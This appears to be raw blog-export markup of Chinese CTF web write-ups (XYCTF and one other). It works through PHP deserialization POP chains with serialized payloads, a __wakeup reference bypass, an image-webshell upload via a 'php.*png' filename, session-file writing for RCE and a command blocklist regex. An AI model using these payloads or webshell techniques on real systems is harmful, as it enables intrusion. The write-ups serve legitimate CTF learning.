$b;</span></span><br><span class="line"><span class="comment">//    public $c;</span></span><br><span class="line"><span class="comment">//    public function __destruct()&#123;</span></span><br><span class="line"><span class="comment">//        $tmp = $this-&gt;c-&gt;name;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    public function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;c = &quot;no!&quot;;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b = $this-&gt;a;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line"><span class="comment">//    public function love()&#123;</span></span><br><span class="line"><span class="comment">//        system($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if(preg_match(&#x27;/R:2|R:3/&#x27;,$_GET[&#x27;pop&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;no&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//unserialize($_GET[&#x27;pop&#x27;]);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$xk</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xk</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$xk</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b = &amp;<span class="variable">$b</span>-&gt;c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;b&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:1:&quot;b&quot;;O:2:&quot;xk&quot;:0:&#123;&#125;&#125;s:1:&quot;c&quot;;N;s:1:&quot;b&quot;;R:4;&#125;</span><br></pre></td></tr></table></figure><p>然后就一样的cat flag.php 在源码中查看就行</p><p><img src="https://bu.dusays.com/2024/05/15/6644200a544d5.png" alt="image-20240424232303193"></p><p><img src="https://bu.dusays.com/2024/05/15/6644200a58b10.png" alt="image-20240424232323253"></p><h3 id="法3："><a href="#法3：" class="headerlink" title="法3："></a>法3：</h3><p>有一个不知道怎么生成的序列化结果是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:“b”:3:&#123;s:1:“c”;O:1:“a”:1:&#123;s:1:“b”;O:2:“xk”:0:&#123;&#125;&#125;s:1:“b”;R:2;s:1:“a”;r:2;&#125;</span><br></pre></td></tr></table></figure><p>这个记过是一个正常绕过的一个</p><p>本来是不能绕过的 因为R:2</p><p>但是将这个payload改一下就行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:“b”:3:&#123;s:1:“c”;O:1:“a”:1:&#123;s:1:“b”;O:2:“xk”:0:&#123;&#125;&#125;s:1:“b”;R:02;s:1:“a”;r:2;&#125;</span><br></pre></td></tr></table></figure><p>将R:2改为R:02就行</p><h2 id="宇宙召唤"><a href="#宇宙召唤" class="headerlink" title="宇宙召唤"></a>宇宙召唤</h2><blockquote><p>来自宇宙深处的呼唤 似乎有个声音一直在你脑中重复 不要回复 不要回复 不要回复</p><p>又有一个距离你较近的声音重复 宇宙真理 42 42 42</p><p>你似乎想与它交流什么 你们的距离似乎很遥远 只能发送1024字节 不要让它失望 为</p><p>什么不理解它的爱</p></blockquote><p><img src="https://bu.dusays.com/2024/05/15/6644200bb462f.png" alt="image-20240424233807761"></p><p>介绍中有提到我们只能传小于等于1024kb的文件 随便上传一个文件看看</p><p>随便传一个</p><p><img src="https://bu.dusays.com/2024/05/15/6644200a6e277.png" alt="image-20240424233848587"></p><p>并且只能上传文件</p><p>如果上传非图片文件提示</p><p><img src="https://bu.dusays.com/2024/05/15/6644200a3df12.png" alt="image-20240502125657624"></p><p>ok 只能小于1kb 那必然是上传文件拿webshell 但是我们又只能上传1kb 同时还只能</p><p>上传 jpg jpep png 三种格式</p><p>还是文件头检测</p><p><img src="https://bu.dusays.com/2024/05/15/6644200bf3146.png" alt="image-20240424234211642"></p><p>绕过</p><p>如果使用传统的绕过 什么截断啊 type 发现都不行</p><p>png里面隐藏图片马，绕过检测，后缀是**php.*png**因为电脑文件名不能出现星号，但是后端应该是把文件名当字符串处理，但是放进目录时因为检测到不合法字符就把星号及其后面的字符截断了，从而生成php文件，拿到flag</p><p><img src="https://bu.dusays.com/2024/05/15/6644200b98c43.png" alt="image-20240502125916375"></p><p><img src="https://bu.dusays.com/2024/05/15/6644200ab0978.png" alt="image-20240502125933568"></p><p>上传成功</p><p>连蚁剑</p><p><img src="https://bu.dusays.com/2024/05/15/6644200a771b2.png" alt="image-20240502130010445"></p><h2 id="my-love"><a href="#my-love" class="headerlink" title="my love"></a>my love</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.|\.php/&quot;</span>,<span class="variable">$this</span>-&gt;man))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件名不能有.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;man,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;woman));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/N$/&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$$tmp</span>[<span class="string">&#x27;name&#x27;</span>]==<span class="string">&#x27;your are good!&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok!&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>直接给了phpinfo</p><p><img src="https://bu.dusays.com/2024/05/15/6644200b16c9d.png" alt="image-20240424234445664"></p><p>session反序列化</p><p>有路径：</p><p><img src="https://bu.dusays.com/2024/05/15/6644200aac45e.png" alt="image-20240424235127583"></p><p>__wakeup绕过一样</p><p>pop链：</p><p>b-&gt;xk</p><p>b-&gt;a-&gt;end</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/N$/&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure><p>传入的test要以N结尾</p><p>而$_SESSION也是以N结尾</p><p>因为没有session_star函数，然后看到($this-&gt;func)()可以调用session_star函数</p><p>然后看到反序列化可以写文件，不能有<code>.</code> 而session文件也没有</p><p>所以：</p><p>先将session反序列化写进去，然后反序列化调用session_star的同时插入test为$_SESSION，这样就能执行命令了</p><p><code>$$tmp[&#39;name&#39;]==&#39;your are good!&#39;</code>这步满足就能执行shell，其中tmp是可控变量，可以利用_SESSION包含session文件<br>所以主要问题是写入session，需要里面满足<code>name</code>变量的值是<code>your are good!</code><br>session默认是按照php的序列化方式，那么先生成一个base64编码过的session方便写入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;your are good!&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">session_encode</span>());</span><br><span class="line"><span class="comment">//bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7</span></span><br></pre></td></tr></table></figure><p>然后利用file_put_contents写入session，根据phpinfo知道session保存的地址<code>/var/lib/php/session</code></p><p>写入session 这里的链子与前面的R23类似，并且不需要绕过R:2 R:3所以直接写就行了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xk</span>();</span><br><span class="line"><span class="variable">$x</span>-&gt;man=<span class="string">&#x27;/var/lib/php/session/sess_1&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;woman=<span class="string">&#x27;bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;c=&amp;<span class="variable">$s</span>-&gt;b;</span><br><span class="line"><span class="variable">$s</span>-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;a-&gt;b=<span class="variable">$x</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;b&quot;:3:&#123;s:1:&quot;b&quot;;N;s:1:&quot;c&quot;;R:2;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:1:&quot;b&quot;;O:2:&quot;xk&quot;:2:&#123;s:3:&quot;man&quot;;s:27:&quot;/var/lib/php/session/sess_1&quot;;s:5:&quot;woman&quot;;s:36:&quot;bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7&quot;;&#125;&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先提交一下pop将session写入<br>然后构造启用session的链，用session_start函数启用session</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">new</span> <span class="title function_ invoke__">end</span>();</span><br><span class="line"><span class="variable">$x</span>-&gt;func=<span class="string">&#x27;session_start&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;c=&amp;<span class="variable">$s</span>-&gt;b;</span><br><span class="line"><span class="variable">$s</span>-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;a-&gt;b=<span class="variable">$x</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;b&quot;:3:&#123;s:1:&quot;b&quot;;N;s:1:&quot;c&quot;;R:2;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:1:&quot;b&quot;;O:3:&quot;end&quot;:1:&#123;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>然后加上test参数和shell进行rce,在请求包里面加上cookie</p><p><img src="https://bu.dusays.com/2024/05/15/6644200b0738e.png" alt="image-20240502131108071"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-XYCTF-wp</title>
      <link href="/2024/05/15/2023-XYCTF-wp/"/>
      <url>/2024/05/15/2023-XYCTF-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="XYCTF-WP-WEB"><a href="#XYCTF-WP-WEB" class="headerlink" title="XYCTF WP WEB"></a>XYCTF WP WEB</h1><p>第一周也是ak了web</p><p>队伍ak了re 目前排名第7 9639分 32解题 比隔壁高1名 </p><h2 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>直接给的源码</p><p>看到有抛出一个报错 并且有__destruct() 所以要GC强制回收</p><p>链子很简单</p><p>强制回收后 反序列化触发<code>__destruct()</code>，echo调用触发<code>__toString()</code>,最后return触发<code>__get</code> 难点在get后<code>unset($b[&#39;a&#39;]);</code> 我们传入的a会被这unset删除</p><p>而<code>call_user_func($a,$b)($c)($d)</code>是用于调用一个给定的回调函数，并将一个数组形式的参数列表作为参数传递给该回调函数</p><p>它首先使用 <code>call_user_func</code> 调用一个回调函数，该回调函数由 <code>$a</code> 变量指定，并将 <code>$b</code> 作为参数传递给这个回调函数。然后，它尝试将 <code>$c</code> 作为参数传递给 <code>call_user_func</code> 的返回值（假设它是一个可调用的东西），并将 <code>$d</code> 作为参数传递给 <code>$c</code> 调用结果的返回值</p><p>也就是说 a可以传入一个函数 然后返回后 可以将c传入一个参数 从而进行命令执行</p><p>也就是说传a&#x3D;system 再传c&#x3D;cat &#x2F;flag就行</p><p>但这时 a会被unset删除</p><p><code>$b=$_POST``$_POST</code>是一个超全局数组，用于收集通过HTTP POST方法提交到当前脚本的变量</p><p>当执行 <code>$b = $_POST;</code> 这行代码时，<code>$b</code> 会成为一个数组</p><p>这就很好处理了</p><p>unset有如下特性</p><blockquote><ul><li>unset整个arr，会立即释放内存</li><li>unset arr的kv， 内存暂时不变。但是如果在本arr中插入新的kv，他会复用unset的内存</li><li>unset arr所有成员之后，新建一个arr2，会新开内存，此时系统占用内存为arr释放前➕arr2新开的内存和</li></ul></blockquote><p>也就是说 我们可以将数组中的值提取出来</p><p>这样就可以绕过unset了</p><p>结合<a href="https://www.php.net/manual/zh/book.array.php">php官方文档函数</a></p><p>这就想到了无参数rce中的current函数了 这个函数可以将数组中的值提取出来</p><p>current函数   返回数组中的当前值</p><p>综上：</p><p>我们传a&#x3D;current&amp;current&#x3D;system这样就可以绕过</p><p>过链子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">   <span class="comment">// public function __toString()</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">      <span class="comment">//  echo &quot;you get 2 A &lt;br&gt;&quot;;</span></span><br><span class="line">      <span class="comment">//  $p = $this-&gt;a;</span></span><br><span class="line">        <span class="comment">//return $this-&gt;s-&gt;$p;</span></span><br><span class="line">   <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">  <span class="comment">//  public function __get($name)</span></span><br><span class="line">   <span class="comment">// &#123;</span></span><br><span class="line">      <span class="comment">//  echo &quot;you get 2 B &lt;br&gt;&quot;;</span></span><br><span class="line">      <span class="comment">//  $a=$_POST[&#x27;a&#x27;];</span></span><br><span class="line">       <span class="comment">// $b=$_POST;</span></span><br><span class="line">       <span class="comment">// $c=$this-&gt;c;</span></span><br><span class="line">       <span class="comment">// $d=$this-&gt;d;</span></span><br><span class="line">       <span class="comment">// if (isset($b[&#x27;a&#x27;])) &#123;</span></span><br><span class="line">       <span class="comment">//     unset($b[&#x27;a&#x27;]);</span></span><br><span class="line">       <span class="comment">// &#125;</span></span><br><span class="line">       <span class="comment">// call_user_func($a,$b)($c)($d);</span></span><br><span class="line">   <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public function __destruct()</span></span><br><span class="line">   <span class="comment">// &#123;</span></span><br><span class="line">      <span class="comment">//  echo &quot;you get 2 C &lt;br&gt;&quot;;</span></span><br><span class="line">      <span class="comment">//  echo $this-&gt;c;</span></span><br><span class="line">   <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//if(isset($_GET[&#x27;xy&#x27;])) &#123;</span></span><br><span class="line">    <span class="comment">//$a = unserialize($_GET[&#x27;xy&#x27;]);</span></span><br><span class="line">    <span class="comment">//throw new Exception(&quot;noooooob!!!&quot;);</span></span><br><span class="line"><span class="comment">//&#125; </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"><span class="variable">$a</span>=NEW <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;c=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;s=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;c=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$c</span>,<span class="number">1</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$D</span>);</span><br></pre></td></tr></table></figure><p>结果：</p><p>a:2:{i:0;O:3:”CCC”:1:{s:1:”c”;O:3:”AAA”:2:{s:1:”s”;O:3:”BBB”:2:{s:1:”c”;s:9:”cat &#x2F;flag”;s:1:”d”;N;}s:1:”a”;N;}}i:1;N;}</p><p>但是这里是不能进行绕过的 不知道怎么回事 一点回显没有 连报错都没有</p><p>所以这里的回收要改一下</p><p><code>$d=array(0=&gt;$c,1=&gt;0);</code> 然后改的结果</p><p>最后的结果是：</p><p>a:2:{i:0;O:3:”CCC”:1:{s:1:”c”;O:3:”AAA”:2:{s:1:”s”;O:3:”BBB”:2:{s:1:”c”;s:9:”cat &#x2F;flag”;s:1:”d”;N;}s:1:”a”;N;}}i:0;i:0;}</p><p><img src="https://bu.dusays.com/2024/05/15/66441eeb7e7f4.png" alt="image-20240406200334316"></p><h2 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#man,,manba out</span></span><br></pre></td></tr></table></figure><p>也是直接给源码</p><p>限制了长度小于13 一下子就想到了限制长度rce </p><p>再看他禁了什么 <code>echo|exec|eval|system|fputs|\.|\/|\\|   /bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i</code></p><p>明显是禁用的命令执行的相关函数和操作</p><p>直接反弹shell</p><p>但正常的反弹shell会使用\  &gt; 这类符号  